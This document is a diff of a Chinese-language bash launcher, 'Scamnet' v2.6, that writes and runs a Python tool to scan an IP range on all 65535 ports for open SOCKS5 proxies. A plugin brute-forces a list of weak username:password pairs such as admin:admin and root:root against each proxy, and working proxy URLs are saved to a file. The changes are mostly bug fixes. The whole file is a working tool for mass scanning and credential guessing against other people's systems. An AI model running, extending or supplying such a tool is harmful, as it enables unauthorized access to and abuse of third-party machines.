@@ -1,6 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet OTC SOCKS5 全端口扫描器（终极稳定版 v2.5 - 语法修复）
-# 修复：Python 语法错误（; 语句链）
+# main.sh - Scamnet OTC SOCKS5 全端口扫描器（v2.6 - 真正等待完成）
 set -e
 
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; NC='\033[0m'
@@ -8,10 +7,10 @@ LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LOG="$LOG_DIR/scanner_$(date +%Y%m%d_%H%M%S).log"
 log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"; }
 
-echo -e "${GREEN}[OTC] Scamnet 完整启动器 v2.5 (全端口 1-65535 - 语法修复)${NC}"
+echo -e "${GREEN}[OTC] Scamnet v2.6 (全端口 1-65535 - 真正等待)${NC}"
 echo "日志 → $LOG"
 
-# ==================== 依赖安装 ====================
+# ==================== 依赖 ====================
 if [ ! -f ".deps_installed" ]; then
     echo -e "${YELLOW}[*] 安装依赖...${NC}"
     if ! command -v pip3 &>/dev/null; then
@@ -19,8 +18,7 @@ if [ ! -f ".deps_installed" ]; then
         if command -v yum >/dev/null; then yum install -y python3-pip; fi
         if command -v apk >/dev/null; then apk add py3-pip; fi
     fi
-    pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple \
-        requests tqdm PyYAML ipaddress 2>&1 | tee -a "$LOG"
+    pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple requests tqdm PyYAML ipaddress 2>&1 | tee -a "$LOG"
     touch .deps_installed
     log "依赖安装完成"
 else
@@ -34,10 +32,10 @@ ports: !range 1-65535
 timeout: 6.0
 workers: 300
 EOF
-log "config.yaml 已创建"
+log "config.yaml 创建"
 
-# ==================== scanner.py（语法修复）================
-cat > scanner.py << 'PY'
+# ==================== scanner.py（真正等待完成）================
+cat > scanner.py << "PY"
 import sys, os; sys.path.append(os.path.dirname(__file__))
 import yaml
 from yaml import SafeLoader
@@ -46,12 +44,14 @@ from concurrent.futures import ThreadPoolExecutor
 import socket, ipaddress, threading, time
 from tqdm import tqdm
 
+# 注册 !range
 def range_constructor(loader, node):
     value = loader.construct_scalar(node)
     start, end = map(int, value.split('-'))
     return list(range(start, end + 1))
 yaml.add_constructor('!range', range_constructor, Loader=SafeLoader)
 
+# 加载配置
 with open('config.yaml') as f:
     cfg = yaml.load(f, Loader=SafeLoader)
 
@@ -108,7 +108,8 @@ def test_proxy(ip: str, port: int, pbar):
 def get_country(ip):
     try:
         for n in ['geo_ipapi']:
-            if n in plugins and (c:=plugins[n].get(ip)): return c
+            if n in plugins and (c := plugins[n].get(ip)):
+                return c
     except: pass
     return 'XX'
 
@@ -119,18 +120,23 @@ def is_socks5_available(ip, port, u=None, p=None):
             m = b'\x05\x02\x00\x02' if u and p else b'\x05\x01\x00'
             s.sendall(m)
             r = s.recv(2)
-            if len(r) != 2 or r[0] != 5: return False, 0, None
-            if r[1] == 0: pass
+            if len(r) != 2 or r[0] != 5:
+                return False, 0, None
+            if r[1] == 0:
+                pass
             elif r[1] == 2 and u and p:
                 a = b'\x01' + bytes([len(u)]) + u.encode() + bytes([len(p)]) + p.encode()
                 s.sendall(a)
                 auth_resp = s.recv(2)
-                if auth_resp[1] != 0: return False, 0, None
-            else: return False, 0, None
+                if len(auth_resp) < 2 or auth_resp[1] != 0:
+                    return False, 0, None
+            else:
+                return False, 0, None
             t = socket.inet_aton(socket.gethostbyname('ifconfig.me')) + b'\x00\x50'
             s.sendall(b'\x05\x01\x00\x01' + t)
             conn_resp = s.recv(10)
-            if conn_resp[1] != 0: return False, 0, None
+            if len(conn_resp) < 2 or conn_resp[1] != 0:
+                return False, 0, None
             s.sendall(b'GET / HTTP/1.1\r\nHost: ifconfig.me\r\n\r\n')
             resp = b''
             st = time.time()
@@ -142,11 +148,13 @@ def is_socks5_available(ip, port, u=None, p=None):
                     if b'\r\n\r\n' in resp: break
                 except: break
             if b'\r\n\r\n' in resp:
-                exp = resp.split(b'\r\n\r\n', 1)[1].decode(errors='ignore').split()[0]
+                body = resp.split(b'\r\n\r\n', 1)[1]
+                exp = body.decode(errors='ignore').split()[0] if body else 'Unknown'
             else:
                 exp = 'Unknown'
             return True, round((time.time() - st) * 1000), exp
-    except: return False, 0, None
+    except:
+        return False, 0, None
 
 def main():
     print('[OTC] 扫描启动')
@@ -161,22 +169,26 @@ def main():
     def worker(ip, port):
         test_proxy(ip, port, pbar)
 
-    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as exe:
+    # 关键修复：手动 shutdown
+    exe = ThreadPoolExecutor(max_workers=MAX_WORKERS)
+    try:
         for ip in ips:
             for port in PORTS:
                 exe.submit(worker, ip, port)
-        exe.shutdown(wait=True)
+    finally:
+        exe.shutdown(wait=True)  # 真正等待所有任务完成
 
     pbar.close()
     print(f'\n[+] 完成！发现 {valid_count} 个可用代理')
 
 if __name__ == '__main__': main()
 PY
-log "scanner.py 已写入（语法修复）"
+log "scanner.py 已写入（真正等待）"
 
 # ==================== 插件 ====================
 mkdir -p plugins
-cat > plugins/__init__.py << 'PY'
+
+cat > plugins/__init__.py << "PY"
 import importlib, os
 def load_plugins():
     p = {}
@@ -188,14 +200,14 @@ def load_plugins():
     return p
 PY
 
-cat > plugins/auth_weak.py << 'PY'
+cat > plugins/auth_weak.py << "PY"
 WEAK_PASSWORDS = [
-        "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
+    "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
     "1234:1234", "admin:admin", "socks5:socks5", "123456:123456",
     "12345678:12345678", "admin123:admin", "proxy:proxy", "admin:123456", "root:root",
-    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888", 
-  "test123:test123", "qwe:qwe", "qwer:qwer", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
-  "12349:12349", "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
+    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888",
+    "test123:test123", "qwe:qwe", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
+    "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
 ]
 def brute(ip, port):
     from scanner import is_socks5_available, TIMEOUT
@@ -206,7 +218,7 @@ def brute(ip, port):
     return None
 PY
 
-cat > plugins/geo_ipapi.py << 'PY'
+cat > plugins/geo_ipapi.py << "PY"
 import requests
 def get(ip):
     try:
@@ -218,7 +230,7 @@ def get(ip):
     return None
 PY
 
-cat > plugins/output_file.py << 'PY'
+cat > plugins/output_file.py << "PY"
 import threading
 file_lock = threading.Lock()
 valid_count = 0
@@ -238,13 +250,13 @@ def save_valid(r):
     print(f'[+] 发现 #{valid_count}: {fmt}')
 PY
 
-log "所有插件已创建"
+log "插件创建完成"
 
 # ==================== 初始化 & 启动 ====================
 echo "# Scamnet 日志 $(date)" > result_detail.txt
 echo "# socks5://..." > socks5_valid.txt
 
-echo -e "${GREEN}[*] 启动扫描...${NC}"
+echo -e "${GREEN}[*] 启动扫描 (157.254.32.0-157.254.52.255, 全端口 1-65535)...${NC}"
 python3 scanner.py 2>&1 | tee -a "$LOG"
 
 VALID=$(grep -c "^socks5://" socks5_valid.txt || echo 0)
